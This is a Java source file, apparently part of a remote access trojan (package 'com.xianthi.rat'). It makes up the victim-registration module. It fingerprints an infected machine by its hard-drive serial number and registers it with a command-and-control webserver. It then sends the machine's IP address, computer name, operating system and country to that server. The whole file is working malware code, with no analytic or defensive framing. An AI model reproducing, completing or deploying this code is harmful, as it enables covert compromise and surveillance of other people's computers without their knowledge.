package com.xianthi.rat;

import java.util.Base64;

import org.json.JSONObject;
public class Victim {

public static void isVictim(String webserver,String rat_id) throws Exception{
	String sn = Loader.getHDDSerialNumber();
	byte[] hash_sn = Base64.getEncoder().encode(sn.getBytes());
	Client4Http http = new Client4Http();
	String response = http.sendGet(webserver+"/api/victims/"+new String(hash_sn, "UTF-8"));
	JSONObject json = new JSONObject(response);
	if(!json.get("victim_id").equals(null)){
	Loader.Victim_ID=json.getInt("victim_id");
	isVictimInfo(webserver);
	}else{
    registerVictim(webserver,rat_id);
	}
    }

public static void registerVictim(String webserver,String rat_id) throws Exception{
	String sn = Loader.getHDDSerialNumber();
	byte[] hash_sn = Base64.getEncoder().encode(sn.getBytes());
	Client4Http http = new Client4Http();
	String parameters = "rat_id="+rat_id+"&hash="+new String(hash_sn, "UTF-8");
	String response = http.sendPost(webserver+"/api/victims/", parameters);
	System.out.println(response);
	registerVictimInfo(webserver,new Integer(Loader.Victim_ID).toString(),Functions.getIPAddress(),Functions.getComputerName(),Loader.OS,Functions.getCountry());
}

public static void isVictimInfo(String webserver) throws Exception{
	String victim_id = new Integer(Loader.Victim_ID).toString();
	Client4Http http = new Client4Http();
	String response = http.sendGet(webserver+"/api/victims/"+victim_id);
	JSONObject json = new JSONObject(response);
	if(!json.get("victim_id").equals(null)){
	updateVictimInfo(webserver,new Integer(Loader.Victim_ID).toString(),Functions.getIPAddress(),Functions.getComputerName(),Loader.OS,Functions.getCountry());
	}else{
	registerVictimInfo(webserver,new Integer(Loader.Victim_ID).toString(),Functions.getIPAddress(),Functions.getComputerName(),Loader.OS,Functions.getCountry());
	}
    }

public static void registerVictimInfo(String webserver,String victim_id,String ip_address,String pc_name,String OS,String country) throws Exception{
	Client4Http http = new Client4Http();
	String os = OS.replaceAll("\\s+","");
	String parameters = "victim_id="+victim_id+"&ip_address="+ip_address+"&pc_name="+pc_name+"&os="+os+"&country="+country;
	http.sendPost(webserver+"/api/victiminfo/", parameters);
}

public static void updateVictimInfo(String webserver,String victim_id,String ip_address,String pc_name,String OS,String country) throws Exception{
	Client4Http http = new Client4Http();
	String parameters = "victim_id="+victim_id+"&ip_address="+ip_address+"&pc_name="+pc_name+"&os="+OS+"&country="+country+"&update=yes";
	http.sendPost(webserver+"/api/victiminfo/", parameters);
}

}

